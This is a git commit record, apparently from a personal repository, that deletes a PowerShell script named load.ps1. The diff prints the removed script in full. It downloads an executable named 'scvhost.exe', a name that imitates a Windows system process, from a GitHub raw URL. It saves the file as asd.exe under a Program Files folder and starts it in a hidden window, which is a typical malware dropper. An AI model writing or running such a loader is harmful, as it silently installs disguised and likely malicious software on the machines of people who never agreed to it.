40b12623552af53820647bb2614654ba5beaad90
requiemmmmmmm <vladrety2@gmail.com>
2026-06-12 02:05:07 +0300

    Delete load.ps1

--- load.ps1
+++
@@ -1,8 +0,0 @@
-$url="https://github.com/requiemmmmmmm/reqq/raw/main/scvhost.exe"
-$path="${env:ProgramFiles}\deluga"
-if(!(Test-Path $path)){
-    New-Item -ItemType Directory -Path $path -Force|Out-Null
-}
-$file="$path\asd.exe"
-(New-Object System.Net.WebClient).DownloadFile($url,$file)
-Start-Process -FilePath $file -WindowStyle Hidden
